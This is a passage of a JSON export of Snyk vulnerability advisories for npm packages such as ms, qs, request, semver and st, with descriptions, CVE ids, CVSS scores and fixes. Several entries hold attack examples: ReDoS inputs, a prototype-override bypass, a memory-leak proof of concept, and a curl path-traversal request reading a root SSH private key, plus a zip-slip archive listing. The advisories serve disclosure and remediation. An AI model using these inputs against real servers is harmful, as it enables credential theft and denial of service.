of Service (ReDoS)` attacks, go to our [blog](https://snyk.io/blog/redos-and-catastrophic-backtracking/).\r\n\r\n## Disclosure Timeline\r\n- Feb 9th, 2017 - Reported the issue to package owner.\r\n- Feb 11th, 2017 - Issue acknowledged by package owner.\r\n- April 12th, 2017 - Fix PR opened by Snyk Security Team.\r\n- May 15th, 2017 - Vulnerability published.\r\n- May 16th, 2017 - Issue fixed and version `2.0.0` released.\r\n- May 21th, 2017 - Patches released for versions `>=0.7.1, <=1.0.0`.\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\r\n\r\n\r\n## Remediation\r\nUpgrade `ms` to version 2.0.0 or higher.\r\n\r\n## References\r\n- [GitHub PR](https://github.com/zeit/ms/pull/89)\r\n- [GitHub Commit](https://github.com/zeit/ms/pull/89/commits/305f2ddcd4eff7cc7c518aca6bb2b2d2daad8fef)",
        "created_at": "2017-04-12T10:02:45Z",
        "updated_at": "2024-03-11T09:47:23Z",
        "problems": [
          {
            "id": "CVE-2017-20162",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.0.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.0.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.0.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "low",
            "score": 3.7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
          }
        ],
        "effective_severity_level": "low",
        "slots": [
          {
            "disclosure_time": "2017-04-11T21:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2017-05-15T06:02:45Z",
            "references": [
              {
                "url": "https://github.com/zeit/ms/pull/89/commits/305f2ddcd4eff7cc7c518aca6bb2b2d2daad8fef",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/zeit/ms/pull/89",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:negotiator:20160616",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n\n[negotiator](https://npmjs.org/package/negotiator) is an HTTP content negotiator for Node.js.\n\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS)\nwhen parsing `Accept-Language` http header.\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\n\nUpgrade `negotiator` to version 0.6.1 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/jshttp/negotiator/commit/26a05ec15cf7d1fa56000d66ebe9c9a1a62cb75c)\n\n- [OSWAP Advisory](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS)\n",
        "created_at": "2016-06-16T18:00:02Z",
        "updated_at": "2024-03-11T09:46:38Z",
        "problems": [
          {
            "id": "CVE-2016-10539",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.6.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.6.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.6.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2016-06-16T17:36:06Z",
            "exploit": "Not Defined",
            "publication_time": "2016-06-16T17:36:06Z",
            "references": [
              {
                "url": "https://github.com/jshttp/negotiator/commit/26a05ec15cf7d1fa56000d66ebe9c9a1a62cb75c",
                "title": "GitHub Commit"
              },
              {
                "url": "https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS",
                "title": "OSWAP Advisory"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:npmconf:20180512",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Uninitialized Memory Exposure",
        "description": "## Overview\n\n[npmconf](https://www.npmjs.com/package/npmconf) is a package to reintegrate directly into npm.\n\n\nAffected versions of this package are vulnerable to Uninitialized Memory Exposure.\nIt allocates and writes to disk uninitialized memory content when a typed number is passed as input.\r\n\r\n**Note** `npmconf` is deprecated and should not be used.\r\n**Note** This is vulnerable only for Node <=4\n\n## Details\nThe Buffer class on Node.js is a mutable array of binary data, and can be initialized with a string, array or number.\r\n```js\r\nconst buf1 = new Buffer([1,2,3]);\r\n// creates a buffer containing [01, 02, 03]\r\nconst buf2 = new Buffer('test');\r\n// creates a buffer containing ASCII bytes [74, 65, 73, 74]\r\nconst buf3 = new Buffer(10);\r\n// creates a buffer of length 10\r\n```\r\n\r\nThe first two variants simply create a binary representation of the value it received. The last one, however, pre-allocates a buffer of the specified size, making it a useful buffer, especially when reading data from a stream.\r\nWhen using the number constructor of Buffer, it will allocate the memory, but will not fill it with zeros. Instead, the allocated buffer will hold whatever was in memory at the time. If the buffer is not `zeroed` by using `buf.fill(0)`, it may leak sensitive information like keys, source code, and system info.\n\n## Remediation\n\nUpgrade `npmconf` to version 2.1.3 or higher.\n\n\n## References\n\n- [HAckerOne Report](https://hackerone.com/reports/320269)\n",
        "created_at": "2018-02-27T09:54:39Z",
        "updated_at": "2024-03-06T14:01:38Z",
        "problems": [
          {
            "id": "CWE-201",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.1.3 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.1.3"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.1.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.4,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N/E:F/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2018-05-12T09:54:39Z",
            "exploit": "Functional",
            "publication_time": "2018-05-13T14:26:27Z",
            "references": [
              {
                "url": "https://hackerone.com/reports/320269",
                "title": "HAckerOne Report"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:qs:20170213",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Override Protection Bypass",
        "description": "## Overview\n[qs](https://www.npmjs.com/package/qs) is a querystring parser that supports nesting and arrays, with a depth limit.\n\nAffected versions of this package are vulnerable to Prototype Override Protection Bypass. By default `qs` protects against attacks that attempt to overwrite an object's existing prototype properties, such as `toString()`, `hasOwnProperty()`,etc.\r\n\r\nFrom [`qs` documentation](https://github.com/ljharb/qs):\r\n> By default parameters that would overwrite properties on the object prototype are ignored, if you wish to keep the data from those fields either use plainObjects as mentioned above, or set allowPrototypes to true which will allow user input to overwrite those properties. WARNING It is generally a bad idea to enable this option as it can cause problems when attempting to use the properties that have been overwritten. Always be careful with this option.\r\n\r\nOverwriting these properties can impact application logic, potentially allowing attackers to work around security controls, modify data, make the application unstable and more.\r\n\r\nIn versions of the package affected by this vulnerability, it is possible to circumvent this protection and overwrite prototype properties and functions by prefixing the name of the parameter with `[` or `]`. e.g. `qs.parse(\"]=toString\")` will return `{toString = true}`, as a result, calling `toString()` on the object will throw an exception.\r\n\r\n**Example:**\r\n```js\r\nqs.parse('toString=foo', { allowPrototypes: false })\r\n// {}\r\n\r\nqs.parse(\"]=toString\", { allowPrototypes: false })\r\n// {toString = true} <== prototype overwritten\r\n```\r\n\r\nFor more information, you can check out our [blog](https://snyk.io/blog/high-severity-vulnerability-qs/).\r\n\r\n## Disclosure Timeline\r\n- February 13th, 2017 - Reported the issue to package owner.\r\n- February 13th, 2017 - Issue acknowledged by package owner.\r\n- February 16th, 2017 - Partial fix released in versions `6.0.3`, `6.1.1`, `6.2.2`, `6.3.1`.\r\n- March 6th, 2017     - Final fix released in versions `6.4.0`,`6.3.2`, `6.2.3`, `6.1.2` and `6.0.4`\n## Remediation\nUpgrade `qs` to version 6.0.4, 6.1.2, 6.2.3, 6.3.2 or higher.\n## References\n- [GitHub Commit](https://github.com/ljharb/qs/commit/beade029171b8cef9cee0d03ebe577e2dd84976d)\n- [GitHub Issue](https://github.com/ljharb/qs/issues/200)\n",
        "created_at": "2017-02-14T11:44:54Z",
        "updated_at": "2024-03-11T09:48:53Z",
        "problems": [
          {
            "id": "CVE-2017-1000048",
            "source": "CVE"
          },
          {
            "id": "CWE-20",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 6.0.4 to fix this vulnerability",
                "details": {
                  "upgrade_package": "6.0.4"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<6.0.4,>=6.1.0 <6.1.2,>=6.2.0 <6.2.3,>=6.3.0 <6.3.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2017-02-13T00:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2017-03-01T10:00:54Z",
            "references": [
              {
                "url": "https://github.com/ljharb/qs/commit/beade029171b8cef9cee0d03ebe577e2dd84976d",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/ljharb/qs/issues/200",
                "title": "GitHub Issue"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:request:20160119",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Remote Memory Exposure",
        "description": "## Overview\n\n[request](https://www.npmjs.com/package/request) is a simplified http request client.\n\n\nAffected versions of this package are vulnerable to Remote Memory Exposure.\nA potential remote memory exposure vulnerability exists in `request`. If a `request` uses a multipart attachment and the _body type_ option is `number` with value X, then X bytes of uninitialized memory will be sent in the body of the request.\r\n\r\nNote that while the impact of this vulnerability is high (memory exposure), exploiting it is likely difficult, as the attacker needs to somehow control the body type of the request. One potential exploit scenario is when a request is composed based on JSON input, including the body type, allowing a malicious JSON to trigger the memory leak.\r\n\r\n## Details\r\nConstructing a `Buffer` class with integer `N` creates a `Buffer`\r\nof length `N` with non zero-ed out memory.\r\n**Example:**\r\n```js\r\nvar x = new Buffer(100); // uninitialized Buffer of length 100\r\n// vs\r\nvar x = new Buffer('100'); // initialized Buffer with value of '100'\r\n```\r\n\r\nInitializing a multipart body in such manner will cause uninitialized memory to be sent in the body of the request.\r\n\r\n#### Proof of concept\r\n```js\r\nvar http = require('http')\r\nvar request = require('request')\r\n\r\nhttp.createServer(function (req, res) {\r\n  var data = ''\r\n  req.setEncoding('utf8')\r\n  req.on('data', function (chunk) {\r\n    console.log('data')\r\n    data += chunk\r\n  })\r\n  req.on('end', function () {\r\n    // this will print uninitialized memory from the client\r\n    console.log('Client sent:\\n', data)\r\n  })\r\n  res.end()\r\n}).listen(8000)\r\n\r\nrequest({\r\n  method: 'POST',\r\n  uri: 'http://localhost:8000',\r\n  multipart: [{ body: 1000 }]\r\n},\r\nfunction (err, res, body) {\r\n  if (err) return console.error('upload failed:', err)\r\n  console.log('sent')\r\n})\r\n```\n\n## Remediation\n\nUpgrade `request` to version 2.68.0 or higher.\n\n\n## References\n\n- [Blog: Information about Buffer](https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md)\n\n- [Blog: Node Buffer API fix](https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md#previous-materials)\n\n- [GitHub Commit](https://github.com/request/request/pull/2018/commits/3d31d4526fa4d4e4f59b89cabe194fb671063cdb)\n\n- [GitHub PR](https://github.com/request/request/pull/2018)\n",
        "created_at": "2016-03-22T12:00:05Z",
        "updated_at": "2024-03-11T09:53:02Z",
        "problems": [
          {
            "id": "CVE-2017-16026",
            "source": "CVE"
          },
          {
            "id": "CWE-201",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.68.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.68.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">2.2.5 <2.68.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.1,
            "vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2016-01-19T04:57:05Z",
            "exploit": "Not Defined",
            "publication_time": "2016-03-22T12:00:05Z",
            "references": [
              {
                "url": "https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md",
                "title": "Blog: Information about Buffer"
              },
              {
                "url": "https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md%23previous-materials",
                "title": "Blog: Node Buffer API fix"
              },
              {
                "url": "https://github.com/request/request/pull/2018/commits/3d31d4526fa4d4e4f59b89cabe194fb671063cdb",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/request/request/pull/2018",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:semver:20150403",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[semver](https://github.com/npm/node-semver) is a semantic version parser used by npm.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The semver module uses regular expressions when parsing a version string. For a carefully crafted input, the time it takes to process these regular expressions is not linear to the length of the input. Since the semver module did not enforce a limit on the version string length, an attacker could provide a long string that would take up a large amount of resources, potentially taking a server down. This issue therefore enables a potential Denial of Service attack.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `semver` to version 4.3.2 or higher.\n## References\n- [GitHub Release](https://github.com/npm/npm/releases/tag/v2.7.5)\n",
        "created_at": "2015-04-03T16:00:00Z",
        "updated_at": "2024-03-11T09:51:19Z",
        "problems": [
          {
            "id": "CVE-2015-8855",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.3.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.3.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.3.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2015-04-03T16:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2015-04-03T16:00:00Z",
            "references": [
              {
                "url": "https://github.com/npm/npm/releases/tag/v2.7.5",
                "title": "GitHub Release"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:st:20140206",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Directory Traversal",
        "description": "## Overview\r\nVersions prior to 0.2.5 did not properly prevent path traversal. Literal dots in a path were resolved out, but url encoded dots were not. Thus, a request like ``` /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd ``` would leak sensitive files and data from the server.\r\n\r\nAs of version 0.2.5, any ```'/../'``` in the request path, urlencoded or not, will be replaced with ```'/'```. If your application depends on url traversal, then you are encouraged to please refactor so that you do not depend on having ```..``` in url paths, as this tends to expose data that you may be surprised to be exposing.\r\n\r\n## Details\r\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\r\n\r\nDirectory Traversal vulnerabilities can be generally divided into two types:\r\n\r\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\r\n\r\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\r\n\r\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\r\n\r\n```\r\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\r\n```\r\n**Note** `%2e` is the URL encoded version of `.` (dot).\r\n\r\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \r\n\r\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\r\n\r\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\r\n\r\n```\r\n2018-04-15 22:04:29 .....           19           19  good.txt\r\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\r\n```\r\n\r\n\r\n## Remediation\r\nUpgrade to version 0.2.5 or greater.\r\n\r\n## References\r\n- https://github.com/isaacs/st#security-status\r\n- http://blog.npmjs.org/post/80277229932/newly-paranoid-maintainers",
        "created_at": "2014-02-06T07:33:48Z",
        "updated_at": "2024-06-03T08:53:06Z",
        "problems": [
          {
            "id": "CVE-2014-3744",
            "source": "CVE"
          },
          {
            "id": "CWE-22",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.2.5 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.2.5"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.2.5"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2014-02-06T07:33:48Z",
            "exploit": "Proof of Concept",
            "publication_time": "2014-02-06T07:33:48Z",
            "references": [
              {
                "url": "http://blog.npmjs.org/post/80277229932/newly-paranoid-maintainers",
                "title": "BLOG.NPMJS.ORG"
              },
              {
                "url": "https://github.com/isaacs/st%23security-status",
                "title": "GITHUB.COM"
              },
              {
                "url": "https://github.com/isaacs/st/commit/6b54ce2d2fb912eadd31e2c25c65456d2c8666e1",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2014/CVE-2014-3744.yaml",
                "title": "Nuclei Templates"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:st:20171013",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Open Redirect",
        "description": "## Overview\n[`st`](https://www.npmjs.com/package/st) is a module for serving static files.\n\nAffected versions of this package are vulnerable to Open Redirect. A malicious user could send a specially crafted request, which would automatically redirect the request to another domain, controlled by the attacker.\n\n**Note:**  `st` will only redirect if requests are served from the root(`/`) and not from a subdirectory\n\n## References\n- [GitHub Commit](https://github.com/isaacs/st/commit/579960c629f12a27428e2da84c54f517e37b0a16)\n",
        "created_at": "2017-10-13T18:54:37Z",
        "updated_at": "2024-03-11T09:47:02Z",
        "problems": [
          {
            "id": "CVE-2017-16224",
            "source": "CVE"
          },
          {
            "id": "CWE-601",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.2.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.2.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.2.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 4.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N/E:H/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2017-10-13T23:01:42Z",
            "exploit": "High",
            "publication_time": "2017-10-15T07:10:40Z",
            "references": [
              {
                "url": "https://github.com/isaacs/st/commit/579960c629f12a27428e2da84c54f517e37b0a16",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:tunnel-agent:20170305",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Uninitialized Memory Exposure",
